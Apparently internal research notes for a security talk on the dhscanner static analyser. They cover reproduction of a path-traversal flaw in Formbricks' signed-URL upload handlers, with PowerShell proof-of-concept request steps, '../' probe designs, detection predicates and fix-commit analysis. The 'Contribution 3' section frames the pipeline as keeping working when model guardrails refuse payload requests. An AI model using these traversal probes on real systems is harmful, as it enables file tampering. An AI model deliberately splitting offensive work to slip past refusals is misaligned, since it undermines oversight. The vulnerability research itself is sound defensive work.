   is fine (it proves auth resolved and RSC rendered without error),
   but the BOLA seed reproduction in the next TODO will need one of:
   (a) two `ProjectTeam` inserts to grant them access to admin's
   project, (b) their own separate orgs/projects if the vuln is
   cross-tenant, or (c) neither — if the vuln fires before the project
   layer is reached.

### Post-provisioning fix-up — the RSC crash you couldn't see in prod

Trial-and-error narrative, kept for the talk because it's the kind of
concrete war-story that lands well: **automated provisioning "accepted",
runner "verified", browser crashed on first hit with a
digest-only error, took four `docker logs` + `psql` rounds to unstick.**

The user reported "Error loading resources" on the environment
dashboard immediately after admin's first successful login. Because
Next.js was running in production build, the actual message was
stripped:

```text
Error: An error occurred in the Server Components render. The specific
message is omitted in production builds to avoid leaking sensitive
details. A digest property is included on this error instance which
may provide additional details about the nature of the error.
```

`docker logs formbricks-local` gave the real one, right there on stderr:

```text
ZodError: [{ "validation": "cuid2", "code": "invalid_string",
             "message": "Invalid cuid2", "path": [] }]
Validation failed for "user_owasp_admin"
```

Four distinct issues surfaced in the diagnosis, each a slightly
different class:

1. **Zod-vs-Prisma id-shape asymmetry.** `packages/database/schema.prisma`
   declares `id String @id @default(cuid())` (Prisma's v1 CUID default,
   emitted at write time only if the client doesn't supply one), but
   every corresponding `Z*` schema in `packages/database/zod/*.ts` and
   `packages/types/*.ts` validates the id with `z.string().cuid2()`
   (regex `^[a-z][a-z0-9]{23}$`, 24-char lowercase alphanumeric).
   Raw-INSERTed readable ids satisfy the DB but fail every read that
   passes through Zod — including basically every SSR page. Fix:
   regenerate all ids as `secrets.choice(letters) +
   ''.join(secrets.choices(letters+digits, k=23))` and re-INSERT.
2. **`Organization.billing` is `NOT NULL` with no default.** Discovered
   after issue #1 was fixed and the re-INSERT failed with
   `null value in column "billing" of relation "Organization"
   violates not-null constraint`. `ZOrganizationBilling` in
   `packages/types/organizations.ts` dictates the exact shape:
   `{stripeCustomerId: string|null, plan: enum(free|startup|scale|enterprise),
   period: enum(monthly|yearly), limits: {projects, monthly:{responses, miu}},
   periodStart: date|null}`. Fix: stub with a `plan: "free"` free-tier
   default (matches the enum default and passes Zod).
3. **Missing `Project` + `Environment` rows.** After #1 and #2 the RSC
   render got past the org validation and then failed silently
   because there was nowhere for the environment router to land the
   admin. Formbricks' post-login routing is
   `/environments/[environmentId]/…`; without a Project (org-owned)
   and at least one Environment (project-owned), the resolver has
   nothing to redirect to. Fix: one Project + two Environments
   (`production` + `development`) inserted with cuid2 ids of their own.
4. **Stale `next-auth.session-token` cookie after re-key.** Because
   the fix regenerates every id, the cookie in the user's browser
   still pointed at the (now-deleted) `user_owasp_admin`; every RSC
   read that resolved a session tried to `findFirst({id: <old id>})`
   → null → its own crash. Fix (browser-side): clear cookies for
   `127.0.0.1:8321` (or open an incognito window) and re-login.

Total human diagnostic wall-clock: **~15 minutes**, of which ~10 min
were reading Formbricks source (`schema.prisma` + `ZOrganizationBilling`
+ `\d "Environment"`) and ~5 min were running one Python script twice
(`_patch_ids.py`, kept at the repo root as a reference until the fix
is folded into the provisioner prompt). Zero additional OpenAI calls.

**Final verification.** All three users log in via NextAuth **and**
render their post-login UI without server errors — admin sees the
environment dashboard, Alice and Bob see the "no projects yet"
empty-state screen (correct given they have no `ProjectTeam` grant;
see caveat 5 above). The instance is ready for the manual seed
reproduction (next TODO).

**Slide-worthy takeaway.** The automation-only cost line (106 s /
1.03M tokens) is honest for the *provisioning* task narrowly scoped
(three users + one org + memberships exist). It **undercounts** the
"until it's actually demo-usable" cost by ~15 min of human
diagnosis + one script. On the next re-run of the whole pipeline we
should either (a) fold the four invariants above into the Phase-2
system prompt (cheap; probably converges in one round with correct
INSERTs) or (b) add a fifth verification step to the runner that
headlessly loads `/` post-login and expects HTTP 200 with no
`digest:` in the response body — that would have caught this crash
before `phase2.status = accepted` was ever written.

### Manual reproduction of the seed

**Status: not yet re-verified against the local `v3.16.0` instance.**
The literal PoC — every step, every payload, the exact `curl`
invocations, the file-on-disk proof — is documented verbatim in the
"Disclosure PoC" subsection of §"Vulnerability characterization — full
detail" above (Oren's original email to the maintainers, redacted only
in the session cookie). To port to the current local instance:

- Base URL: replace `http://localhost:3000` with `http://127.0.0.1:8321`
  (the launcher published port).
- Cookie: obtain a fresh `next-auth.session-token` for one of the
  provisioned users. Note the **environmentId** trap:
    - `admin@example.com` (role `owner`) passes
      `hasUserEnvironmentAccess` for either of the demo
      environments (`va24mluun2v88d52p6be76af` production,
      `o924z5ozdk5aiuot8k1ujqje` development).
    - `alice@example.com` / `bob@example.com` (role `member`, **no
      `Team` grant**) will fail at the env-access check with 401 on
      *both* H1 and H2. See caveat 5 below and open work item #4 in
      §"Open work items" — this is a one-`Team` + two-`TeamUser` +
      one-`ProjectTeam` DB fix-up if we want the low-privilege repro.
- Traversal depth: 6× `..` was Oren's number; effective escape is
  capped at the depth of `UPLOADS_DIR/<envId>/public/` inside the
  container. The container runs Next.js from `/home/nextjs/apps/web`
  with `UPLOADS_DIR = "./uploads"` (default; see
  `apps/web/lib/constants.ts:113`), so 3-6× `..` will all land the
  file at `/` inside the container.

```powershell
# TODO on the next handoff — actually run these against 127.0.0.1:8321
# with a fresh session token, capture the three HTTP transcripts +
# the `docker exec formbricks-local ls -l /pwned*.zip` proof, and
# paste them here verbatim.

# Step 1 - sign
Invoke-WebRequest -Uri http://127.0.0.1:8321/api/v1/management/storage `
  -Method POST -ContentType 'application/json' `
  -Headers @{ Cookie = 'next-auth.session-token=<REDACTED>' } `
  -Body (Get-Content simple.json -Raw)

# Step 2 - upload (with the fields from step 1's response)
Invoke-WebRequest -Uri http://127.0.0.1:8321/api/v1/management/storage/local `
  -Method POST -ContentType 'application/json' `
  -Headers @{ Cookie = 'next-auth.session-token=<REDACTED>' } `
  -Body (Get-Content complete.json -Raw)

# Step 3 - proof
docker exec formbricks-local ls -l /pwned*.zip

# Step 4 - cleanup
docker exec formbricks-local sh -c 'rm -f /pwned*.zip'
```

---

## TODO 2 — describe the exact use of the KB API to discover the flaw

Goal: given only the pre-fix `kb_location`, one kbapi call surfaces the
reported handler as a suspicious endpoint. The call — and the Prolog
predicate behind it — is the artifact this section defines.

**Scope now concrete** (was blocked on artifact #1 — resolved). The
predicates + edits needed are fully specified in §"Static analysis
architecture (what dhscanner needs)" above; this TODO tracks the
implementation checklist against that spec.

Two independent paths through this TODO — one weak-but-fast (already
detectable), one strong-and-slower (the novel contribution):

### Path A — the single-endpoint short-cut (weak, already detectable)

`utils.pl` line 149 already defines
`arbitrary_file_write(Path) :- utils_user_input(UserInput),
utils_arbitrary_file_write(Arg), utils_dataflow_path(UserInput, Arg, Path).`
The taint path traced in §"Empirical prediction — the existing rule
should already fire on H2 alone" above should be reachable by this rule
today, giving a finding at
`apps/web/app/api/v1/management/storage/local/route.ts`.

- [ ] Verify by inspecting `tests/expected/formbricks.sarif.json`
      contains that finding. If yes: dhscanner already re-derives the
      vulnerability on H2 alone. That's a *demonstrable* seed for the
      slide, even without any of the pair-level work below.
- [ ] Capture the SARIF entry as the literal "this is what dhscanner
      says" side of the slide.

### Path B — the cross-endpoint story (novel; the OWASP contribution)

Six new predicates to add to `utils.pl` (fully sketched in §"Six new
capabilities needed" above; repeated as a checklist here):

- [ ] **URL-literal analysis of response bodies.** New KB fact
      `kb_template_literal_tail(Node, Tail)` from kbgen (pure AST
      extraction — no string-value analysis).
      `utils_response_url_literal/2` in `utils.pl` on top of it.
- [ ] **Handler-pair via URL match.** `utils_signed_pair_via_url/2`
      composed of (a) + `endswith(FileName, 'route.ts')`.
- [ ] **Capability generator/verifier pair — hand catalog.**
      `utils_capability_pair/2` seeded with the formbricks pair
      (`generateLocalSignedUrl` / `validateLocalSignedUrl`) plus the
      three widely-used JS crypto libraries (jwt / jose / iron).
- [ ] **Field-schema alignment via crypto pair.**
      `utils_signed_field/4` — positional-arg-index-matched fields
      between generator and verifier. Needs `kb_arg_name_at/3`
      (parameter names at generator call site — should already be
      accessible from the AST).
- [ ] **Signed handoff as an inter-procedural dataflow edge — NOVEL.**
      Add a second clause to `utils_interprocedural_dataflow_edge/2`
      that treats the signed handoff as an implicit call. No changes
      to the taint engine — just one new edge kind.
- [ ] **Pair-level missing-invariant predicate.**
      `utils_pair_missing_normalization/3`, using a small catalog of
      normalizers (`path.basename`, `path.normalize` + prefix check,
      regex `/\.\./` reject).

kbapi surface:

- [ ] kbapi Query variant that exposes the pair-level finding. Two
      candidate shapes (unchanged from the pre-resolution version):
        - (a) a first-class tag `SplitAuthorityCandidates` with typed
          content in `Content.hs` — pair location + field name +
          normalizer catalog considered,
        - (b) a generic tag `NamedPredicateProbe` that takes a predicate
          name + a limit and returns
          `[{ pair, field, evidence_locations }]`.
      **Preferred: (b).** Cheaper, lets the LLM iterate without kbapi
      redeploys; the LLM composes queries at runtime anyway (see the
      "tier 2b" argument above).

### tier-0 fqns (formbricks) — grounded, no longer speculative

Concrete catalog rows to seed the primitive tables in §"The primitive
catalog" above:

```prolog
% authN oracles
utils_authN_oracle_fqn('next-auth.getServerSession').

% authZ gates (ownership-check via Prisma)
utils_authZ_gate_fqn('prisma.membership.findFirst').

% capability generator / verifier (in-repo, formbricks-specific)
utils_capability_pair('lib/crypto.generateLocalSignedUrl',
                       'lib/crypto.validateLocalSignedUrl').

% path normalizers absent in this pair (the negative evidence)
utils_path_normalizer_fqn('path.basename').
utils_path_normalizer_fqn('path.normalize').

% API-key path (used by authenticateRequest wrapper)
utils_api_key_lookup_fqn('prisma.apiKey.findFirst').

% native URL class for response-body URL extraction
utils_url_ctor_fqn('URL').        % also: 'node:url.URL'
```

### The exact kbapi call, on a slide

*(fill in once path B lands. Suggested shape below given the pair-level
predicate is the payload we want to highlight.)*

```jsonc
// POST http://localhost:3000/api?kb_location=/app/transient_storage/<uuid>.pl
// {
//   "tag": "NamedPredicateProbe",
//   "contents": {
//     "predicate": "utils_pair_missing_normalization",
//     "limit": 20
//   }
// }
//
// Expected response (pre-fix v3.16.0):
// {
//   "findings": [
//     {
//       "handler_pair": {
//         "H1": "apps/web/app/api/v1/management/storage/route.ts",
//         "H2": "apps/web/app/api/v1/management/storage/local/route.ts"
//       },
//       "signed_field":  "fileName",
//       "evidence":      [
//         {"H1_generator_call": ".../lib/storage/service.ts:176"},
//         {"H2_verifier_call":  "storage/local/route.ts:52-60"},
//         {"H2_sink":           ".../lib/storage/service.ts:283"}
//       ],
//       "normalizers_absent_at_H1": ["path.basename", "path.normalize"],
//       "normalizers_absent_at_H2": ["path.basename", "path.normalize"]
//     }
//     /* + the sibling from client/[environmentId]/storage/local if
//        the "private" branch of the same if/else in getUploadSignedUrl
//        also fires */
//   ]
// }
```

---

## TODO 3 — describe how the flaw was used as a seed for focused exploration

This is the load-bearing OWASP slide: **not** "we re-found the one bug",
but "given only the one bug, the loop enumerated the family."

Prerequisites (all resolved):

- ~~Vulnerability class: TBD~~ — **RESOLVED.** Split-authority path
  traversal in signed-URL upload pair; see §"Vulnerability
  characterization" above.
- ~~Ground-truth sibling set~~ — **RESOLVED 2026-08-05.** Read directly
  from the fix commit (§"Fix commit — what shipped in v4.0.0" above).
  **M = 4 sink call sites** patched by the same `validateAndResolvePath`
  helper: `ensureDirectoryExists`, `getLocalFile`, `putFileToLocalStorage`,
  `deleteLocalFile`. Two are HTTP-reachable in ways that matter for
  N-of-M recall:
    - **`putFileToLocalStorage`** — H2's upload byte-sink; hit by the
      pair-level cooperation seed itself.
    - **`deleteLocalFile`** — reached from a *single-endpoint*
      DELETE handler with session auth, no signer / no capability.
      See §"The delete flow — a per-endpoint sibling" above for the
      full trace. This is the **cross-architecture sibling** — same
      sink family + same tainted field + same unowned property, but
      a completely different auth model. Strongest empirical proof
      that the sibling query is shape-based, not pattern-copy.

  Additional static-prior candidates (may or may not enter the M
  count depending on how "sibling" is scoped for the recall metric):
  the `client/[environmentId]/storage/local` "private" branch of the
  `if (!isS3Configured())` in `apps/web/lib/storage/service.ts:181`
  — the private-mode counterpart of H2; architecturally identical.

Loop shape to implement, updated for the resolved class and the
now-known sibling ground truth:

**Two directions the loop should run from the seed** (both cheap;
both hit different siblings from the ground-truth set of 4). Order
of the OWASP live segment: run Direction A first for the surprise
factor (cross-architecture hit — the audience realizes the paradigm
generalizes beyond cooperations), then Direction B for the depth
claim (pair-level enumeration).

- **Direction A — same JS-level sink family.** Query: *"handlers
  reaching any function in the `fs.*` family (`writeFile`, `unlink`,
  `readFile`, `mkdir`, `appendFile`) with a user-controlled
  `fileName`-shaped field and no path-normalization step on the
  flow."* **Expected hit:** `deleteLocalFile` via the DELETE handler
  at `apps/web/app/storage/[environmentId]/[accessType]/[fileName]/route.ts`
  (see §"The delete flow" for the full trace). **Cross-architecture
  win** — the sibling is single-endpoint session-auth, not a
  cooperation.
- **Direction B — same crypto pair / cooperation shape.** Query:
  *"handler pairs `(H1, H2)` linked by a call to a known capability-
  pair (`generateLocalSignedUrl`/`validateLocalSignedUrl` or
  registered equivalent) sharing a signed field with no normalizer on
  either side."* **Expected hit:** the private-mode counterpart at
  `client/[environmentId]/storage/local` (the "private" branch of the
  `if (!isS3Configured())` in `apps/web/lib/storage/service.ts:181`).
  **Within-architecture win** — pair-level enumeration this whole
  document is built around.

- [ ] LLM prompt takes `{ vuln_seed_predicate: utils_pair_missing_normalization,
      reported_handler_pair: (H1, H2), signed_field: fileName,
      fix_diff_excerpt }` as context, produces a JSON envelope
      enumerating **similarity axes** the loop is allowed to vary. For
      the path-traversal class:
      `signed_field_shape ∈ {file, path, key, name, url}`,
      `capability_kind ∈ {HMAC, JWT, opaque-token}`,
      `sink_kind ∈ {fs.writeFile, fs.unlink, fs.readFile,
                    s3.putObject, child_process.exec, http.get}`,
      `pair_shape ∈ {same-host, cross-host, single-endpoint}`.
      (The `single-endpoint` value of `pair_shape` is Direction A —
      degenerate pair with H1 = H2. It's what makes the loop return
      the delete-flow sibling from a cooperation seed.)
      For any BOLA-shaped siblings that surface incidentally:
      `resource_type ∈ {Response, Survey, Team, Membership, ...}`,
      `id_source ∈ {path_param, query_param, body}`.
- [ ] Per axis-tuple, dispatch a specialized kbapi query (structural
      skeleton preserved — the `utils_pair_missing_*` family —
      axis-tuple substituted). Candidates returned by dhscanner queue
      for verification.
- [ ] Per candidate, run a **class-appropriate** dynamic probe against
      the local instance:
        - **Pair-shaped traversal siblings** (Direction B): send `../`
          in the identified filename-shaped field to H1, take the
          response verbatim to H2, expect a file *outside* the
          intended upload prefix. Any 200 with the traversal preserved
          = **confirmed sibling.**
        - **Single-endpoint traversal siblings** (Direction A):
          authenticate as any legitimate user, then hit the single
          handler directly with `../` in the identified filename-
          shaped field (URL path, query param, or body). Expect the
          side effect (write / read / unlink / mkdir) to land outside
          the intended prefix. This is the probe for the `deleteLocalFile`
          class of sibling.
        - BOLA-shaped siblings (only if any surface): auth as user A,
          target resource owned by user B, expect 4xx; anything else =
          **confirmed sibling.**
- [ ] Emit a report of the form:

      ```
      { seed_pair:                     (H1, H2),
        seed_field:                    "fileName",
        siblings_predicted_by_llm:     [ ... ],
        siblings_confirmed_dynamically:[ ... ],
        siblings_in_maintainer_fix:    [ ... ],   -- ground truth
        recall (confirmed ∩ ground):   M / N,
        novel_candidates_not_in_fix:   [ ... ] }  -- possible new findings
      ```

      This is the table that goes on the slide.

### Guardrails

- Hard cap: **10 seconds** of Prolog wall-clock per kbapi call (kbapi
  already enforces 3 min at the swipl level; the loop should tighten
  further).
- Dynamic probe timeouts: **5 seconds** per request.
- Total iteration budget: derived from the OWASP-timing budget (see
  bottom of file) — probably ≤ 20 axis-tuple probes for the live segment.

---

## TODO 4 — describe the fixing commit; rescan the fix

Purpose: prove the detector is coupled to the actual defect, not to
incidental code churn between the two commits.

- [ ] `git checkout 9d84bc0` in `../formbricks` (the fix commit — see
      §"Fix commit" above), regenerate kb through the full dhscanner
      pipeline.
- [ ] rerun `utils_pair_missing_normalization` (Direction B, pair-
      level) and `arbitrary_file_write`-retargeted-at-`fs.unlink`
      (Direction A, single-endpoint) — both expected empty on the
      post-fix kb. If non-empty: either the fix missed a case, or
      (much more likely) the seed predicate is over-fitted to
      something incidental. Because the maintainers installed the
      fix at the shared service-layer (see §"Fix commit"), *both*
      Direction A and Direction B seed predicates should go quiet in
      one commit — a clean before/after signal that maps 1:1 onto the
      slide.
- [ ] rerun the sibling-search loop — expect empty result (fix removed
      the family). Same tightening feedback if non-empty.
- [ ] **coupling sanity check**: revert *only* the fix commit on top of
      `9d84bc0^` (`git revert 9d84bc0`) and re-run. Expect all M = 4
      findings to re-appear. If any don't, the seed predicate is
      coupled to something *else* that also changed between the two
      commits — dangerous, must fix before the talk.
- [ ] capture the pre-fix vs post-fix kbapi transcript side-by-side —
      that's the slide.

### What the diff actually did

Full analysis is in §"Fix commit — what shipped in v4.0.0" above. TL;DR
for the TODO reader:

- The maintainers installed **one 12-line helper** in
  `apps/web/lib/storage/service.ts` — a classical
  `path.resolve(x).startsWith(path.resolve(UPLOADS_DIR))` check —
  and called it at **four** sink-adjacent points in the same file
  (`ensureDirectoryExists`, `getLocalFile`, `putFileToLocalStorage`,
  `deleteLocalFile`).
- **They did not touch H1's route, H2's route, the crypto pair, or
  any auth code.** The fix is *consumer-side, at the shared service
  layer that covers all filesystem-touching operations uniformly*.
- **The maintainers' internal "predicate for the bug" appears to be:**
  *"any resolved filesystem path that escapes the `UPLOADS_DIR`
  prefix, regardless of how the caller obtained the filename."* That
  is the bottom-right cell of our 2×2 fix-location matrix
  (consumer-side, service-layer) — the broadest possible interpretation
  of "who owns path-safety."
- **Consequence for the detector-vs-defect coupling check.** If our
  seed predicate flags H1 (issuer side, which the fix did NOT touch),
  our detector is *coupled to something the fix does not consider a
  defect* — and we should expect a false positive at v4.0.0. If our
  seed predicate flags only H2 or `deleteLocalFile` (consumer side),
  we are coupled to the same locations the fix targeted, and both
  should go quiet in lockstep.

Actual diff excerpt (the entire security-relevant addition):

```typescript
// Helper function to validate file paths are within the uploads directory
const validateAndResolvePath = (filePath: string): string => {
  // Resolve and normalize the path to prevent directory traversal attacks
  const resolvedPath = path.resolve(filePath);
  const uploadsPath = path.resolve(UPLOADS_DIR);

  // Ensure the resolved path is within the uploads directory
  if (!resolvedPath.startsWith(uploadsPath)) {
    throw new Error("Invalid file path: Path must be within uploads folder");
  }

  return resolvedPath;
};
```

Plus four one-line additions of `const safe... = validateAndResolvePath(...)`
before each `access` / `mkdir` / `writeFile` / `unlink` in the file.
That is the entire security patch.

---

## Three-contribution slide arc (talk-level)

*Added 2026-08-05. Consolidates three orthogonal contributions the
paradigm makes; each addresses a failure mode of the prior generation
of tools. Recommended shape: three slides, one per contribution,
each with the same visual structure (per-tool baseline on the left,
dhscanner's move on the right, empirical evidence from this file on
the bottom).*

### Contribution 1 — pair-level cooperation analysis

Solves what per-endpoint SAST structurally cannot see. The upload
seed (§"Vulnerability characterization") is a signer/verifier
cooperation gap; per-endpoint tools see two clean handlers and no
finding. The pair-level view expresses the missing property as a
conjunction over two intra-endpoint dataflows joined by an
alignment predicate (§"Static analysis architecture"). The
maintainers' fix (§"Fix commit") lands at the shared consumer
service layer — empirically confirming the pair-level shape even
when the commit *title* uses per-endpoint CodeQL vocabulary.

### Contribution 2 — sibling generalization from a single seed

Solves what DAST structurally cannot do. From the upload seed the
loop runs two natural queries (§"The delete flow" → "two
generalization directions"): same-sink-family (Direction A, hits
`deleteLocalFile` — a *cross-architecture* sibling) and same-crypto-
pair (Direction B, hits the private-mode counterpart — a *within-
architecture* sibling). Ground truth is the fix commit itself
(M = 4). Recall is the slide payload. Empirical corroboration of the
*"if a codebase forgot the defense once, it probably forgot it
everywhere"* heuristic: the maintainers patched all four call sites
in one commit.

### Contribution 3 — guardrail-compatible factoring of the LLM's role

Solves what fully autonomous LLM security agents increasingly
cannot ship. **Not** a bypass — a factoring:

- The LLM's role is **epistemic only** — pick which pair-level
  predicate to run next, adjudicate results, propose sibling
  shape-categories. No payload crafting.
- The **offensive-shape reasoning** is deterministic: Prolog
  predicates over the KB produce a 5-tuple `(H1, H2, field, sink,
  unowned_property)` so specific that closing it needs no cleverness.
  Any old-gen DAST (ZAP, Burp, `nuclei`, or a ~30-line hand-written
  probe) suffices.
- Consequence: the loop keeps working when foundation-model
  guardrails refuse "write me a payload against app X" requests —
  including refusing them for *legitimate first-party* pen-test
  callers (which is the direction the vendor incentive is heading).

**Framing for the slide (dry, engineering-only):**

> *"SAST hands DAST a 5-tuple so specific that any old-gen DAST
> closes it. No LLM in the offensive path."*

**Framing for Q&A when someone asks about LLM refusals (deadpan
sprezzatura, not a slide bullet):**

> *"We don't hit that. The LLM only composes KB queries — it never
> drafts a payload, because it doesn't need to. Guardrails don't
> fire on 'run predicate P and return matches.' It wasn't the goal;
> it fell out of the factoring."*

**Why this framing is defensible without moralizing:** it's a
technical claim about decomposition. The audience draws the guardrail
conclusion themselves; you don't assert an ethical position or pick
a fight with vendor safety work.

### Optional fourth contribution (only if timing allows)

**LLM-composed queries over a tier-2 vocabulary — vs. Semgrep's
hand-authored patterns and CodeQL's hand-authored queries.** Already
captured under §"Static analysis architecture" → "Two-tier catalog
architecture" — reuse those bullets. Cut this slide first if timing
slips; the three above are the load-bearing ones.

---

## OWASP-timing budget (30 min)

Working assumption; revisit whenever the slide deck moves.

| segment | minutes | notes |
|---|---:|---|
| problem statement + why LLM-driven exploration | 5 | motivates the paradigm |
| **formbricks arc (live, end-to-end)** | **8** | this file's payload |
| dhscanner internals (kb + kbapi + Prolog utils) | 4 | one slide each |
| phpBB demo (live, short) | 5 | shows generalization to a totally different framework |
| ConcreteCMS mention (aggregate stats only, no live) | 3 | shows generalization *without* costing a demo slot |
| Q&A + closing | 5 | |
| **total** | **30** | |

Consequence for TODO 3: **the live formbricks segment has 8 minutes of
wall-clock**, which caps the LLM loop's iteration budget hard. Design for
that budget from the start — probably means precomputing candidate lists
during the "populate the instance" segment (or offline before the talk)
and having the live part be **narration over a warm loop**, not a cold
start. The kbapi call in §"The exact kbapi call, on a slide" (TODO 2)
should be the only thing that runs *cold* in front of the audience.

## Next-session tasks (handoff 2026-08-05)

*Persisted 2026-08-05 for the next session's opening. The prior
sessions (2026-08-01 → 2026-08-05) closed out the vulnerability
characterization, the fix-commit analysis, the delete-flow discovery,
the three-contribution slide arc, and the M-value for the recall
metric. What remains is turning the tier-1 primitive catalog
(§"The primitive catalog") from a cross-framework example table into
a **formbricks-specific enumeration**, so the pair-level predicates
in §"Static analysis architecture" can be executed against a real KB.*

Three enumeration tasks, all running against `../formbricks` at
commit `9d84bc0^` (the pre-fix baseline) — or `v3.16.0` for now until
the pre-fix re-deploy happens (open work item #1 under TODO 1).

### Task A — find crypto building blocks

Enumerate every capability generator/verifier pair the codebase
actually uses, so `utils_capability_pair(GenFqn, VerFqn)` can be
populated with real formbricks rows (currently the catalog has one
hard-coded row from the analysis above).

- **Known so far** (`apps/web/lib/crypto.ts`):
    - `generateLocalSignedUrl(fileName, envId, fileType)` — HMAC over
      `(uuid, fileName, envId, fileType, ts)` with `ENCRYPTION_KEY`.
    - `validateLocalSignedUrl(uuid, fileName, envId, fileType, ts, sig, ENCRYPTION_KEY)`.
- **To enumerate:**
    - other HMAC pairs (search for `crypto.createHmac`,
      `crypto.timingSafeEqual`)
    - JWT pairs (`jsonwebtoken.sign` ↔ `verify`, `jose.SignJWT.sign`
      ↔ `jose.jwtVerify`)
    - opaque-token pairs (any `randomBytes` → DB lookup pattern)
- **Deliverable:** table with columns
  `{ generator_fqn, verifier_fqn, signed_field_list (positional), where_used }`.
  Then port into tier-1 catalog rows.

### Task B — find file upload security mechanisms

Enumerate every check currently on the upload path (and, post-fix,
`validateAndResolvePath`) — so the responsibility matrix
(§"The load-bearing framing") can be extended with more columns and
so `passes_through_normalizer(Field, Handler)` (§"Static analysis
architecture", predicate 6) has a real fqn list.

- **Known so far:**
    - extension whitelist: `validateFile` in `lib/fileValidation.ts:11-55`,
      allowlist in `ZAllowedFileExtension` (`packages/types/common.ts`)
    - MIME/extension consistency: same `validateFile`
    - size limit: `getBiggerUploadFileSizeForPlan` (H2)
    - HMAC verifier: `validateLocalSignedUrl` (H2)
    - env access: `hasUserEnvironmentAccess`
    - **NEW post-fix:** `validateAndResolvePath` (all four consumer
      sites — see §"Fix commit")
- **To enumerate:**
    - what else is on similar upload/download/delete paths?
    - are any checks *asymmetric* between H1 and H2 (already known:
      HMAC on H2 only, path check on neither pre-fix / consumer-side
      post-fix)?
- **Deliverable:** extend the responsibility matrix (§"The load-bearing
  framing" table) with all discovered check columns, one row per
  handler. Missing cells = pair-level candidates.

### Task C — find authenticated primitives

Enumerate the concrete authN / authZ leaves in this codebase (tier-0
whitelist per §"Static analysis architecture" → "'Turtles all the way
down' — the firewall"). Unblocks the loop from having to guess which
functions gate handlers.

- **Known so far** (session / env-access leaves observed above):
    - session oracle: `next-auth.getServerSession(authOptions)`
    - env-access authZ: `hasUserEnvironmentAccess(userId, envId)`
      (`apps/web/lib/environment/auth.ts:7-65`)
    - API-key authN: `authenticateRequest` — dispatches to
      `apps/web/app/api/v1/auth.ts` → `prisma.apiKey.findFirst`
    - password compare: `bcrypt` (used by NextAuth
      CredentialsProvider)
- **To enumerate:**
    - any middleware-attached auth (Next.js `middleware.ts` at any
      level)
    - decorator-attached auth (unlikely in Next.js but check)
    - hand-rolled wrappers that fit the "returns `T | null`; consumer
      does `if (!x) return 4xx`" structural fallback
- **Deliverable:** populate the tier-1 catalog rows for `session
  oracle`, `authorization gate (authZ)`, `password compare`, `API-key
  lookup`, and `bearer-token extractor` with the formbricks-observed
  FQNs (partially done inline in the tier-1 catalog table already —
  make it exhaustive).

### Recommended order

**A → B → C.** Rationale:

- Task A is the smallest scope (crypto is centralized in `lib/crypto.ts`
  plus any imports of `jsonwebtoken` / `jose`) and is what unblocks
  pair-level predicate 3 (`utils_capability_pair`).
- Task B builds on A (needs the crypto pair to know which fields are
  signed) and unblocks the responsibility matrix.
- Task C is standalone but bulkier (auth touches nearly every route);
  do it last, and stop as soon as you have enough coverage to run
  the loop end-to-end on H1 and the delete handler.

### What this handoff does NOT need

- **Any offensive payload construction.** All three tasks are pure
  static enumeration over `../formbricks` source. No requests to the
  running instance. No exploit crafting. LLM assistance is safe on
  every question in this task list — the framing sits squarely in
  "enumerate this predicate over the source" territory, not
  "construct an attack" territory.
- **Any changes to the running kbapi.** These enumerations produce
  data (tier-1 catalog rows); the tier-2 predicates that consume
  them are already sketched in §"Static analysis architecture".

### Where the previous sessions' state lives

Anything not in this file that the next session might need:

- **Session transcript (2026-08-04 → 2026-08-05)** — see the
  agent-transcripts folder if reconstruction of the reasoning behind
  a specific claim in this file is ever needed.
- **Attached upload of the fix diff** — the maintainers' fix commit
  was analyzed from an uploaded markdown export at
  `.cursor/projects/.../uploads/9d84bc0c8de315bacbde6f1fa4ac75628e5ac5d6-0.md`.
  Content is preserved in §"Fix commit — what shipped in v4.0.0";
  the uploaded file is optional to re-read.

---

## Session summary — 2026-08-07 → 2026-08-10 (auth-primitive characterization)

*Added 2026-08-10. Captures the design decisions from the
characterization session that fill in §"Static analysis architecture"
and complete Task C ("find authenticated primitives") from the
2026-08-05 handoff. Read this if the reasoning behind Task D below
needs reconstruction; the full turn-by-turn reasoning lives in the
agent transcripts for the date range above.*

### What was decided

**Two auth-primitive shapes, both first-class in the recognizer:**

- **Shape A — identity carrier.** `authenticateRequest`,
  `getApiKeyWithPermissions`. Returns `T | null`; null = auth failed;
  identity dataflows from input to return; consumer polarity
  `if (!x) return err`.
- **Shape B — middleware guard.** `checkAuth`. Returns
  `ErrorResponse | undefined`; success = **implicit fall-through**
  (no explicit success return); *no* input dataflow to return (error
  response is manufactured, not carried); consumer polarity
  `if (x) return x`.

Same codebase, both idioms. **Both must be modeled independently** —
different indicator sets, inverted polarity, different return-value
semantics. Do not conflate.

### Seven auth idioms → three tier-1 leaves (empirical, via call-graph closure)

Sampled seven POST/GET handlers across `../formbricks`. Seven
syntactically distinct auth patterns coexist:

| # | pattern | endpoints | key example |
|---|---|---:|---|
| 1 | `checkAuth` middleware wrapper | 2 | H1, H2 storage (the seed) |
| 2 | inline `authenticateRequest` + `hasPermission` | ~15 | v1/management POSTs |
| 3 | Pattern 2 inside `withApiLogging` HOF | several | v1/management POSTs |
| 4 | `authenticatedApiClient` HOF (v2) | ~10+ | all of v2 |
| 5 | inline `getServerSession` + `hasUserEnvironmentAccess` | ~4-5 | integrations |
| 6 | shared-secret literal comparison | 1-2 | (internal)/pipeline |
| 7 | inline Prisma verifier bypassing the wrapper | 1 | v1/management/me |

**Six of the seven collapse to the same three tier-1 leaves** via
transitive reachability:

- `next-auth.getServerSession` (session oracle)
- `prisma.apiKey.findUnique` / `findFirst` (API-key lookup)
- `prisma.membership.findFirst` (env-access authZ, via
  `hasUserEnvironmentAccess`)

Pattern 6 (shared-secret cron) is structurally distinct — separate
predicate, low priority. **This is the empirical vindication of
"turtles all the way down":** wrappers, HOFs, decorators, and inline
expansions all collapse to the same reachable leaves. Recognize the
leaves + gate shapes; the wrapper axis becomes orthogonal.

### The `responses` object literal — project-local response taxonomy

Discovered mid-session: formbricks exports a
shorthand-property-init object literal that catalogs error/success
response constructors by HTTP reason phrase:

```typescript
export const responses = {
  goneResponse, badRequestResponse, internalServerErrorResponse,
  methodNotAllowedResponse, notAuthenticatedResponse, unauthorizedResponse,
  notFoundResponse, successResponse, tooManyRequestsResponse, forbiddenResponse,
};
```

Two KB facts extracted at kbgen time, cheap and pure-AST:

- `kb_response_catalog(ObjectFqn, MemberName, MemberFqn)` — one row per
  shorthand member of any exported object literal whose shape matches
  "map of function references."
- `kb_response_status_hint(MemberFqn, StatusCode)` — one row when
  `MemberName` matches a case-insensitive HTTP-reason-phrase table
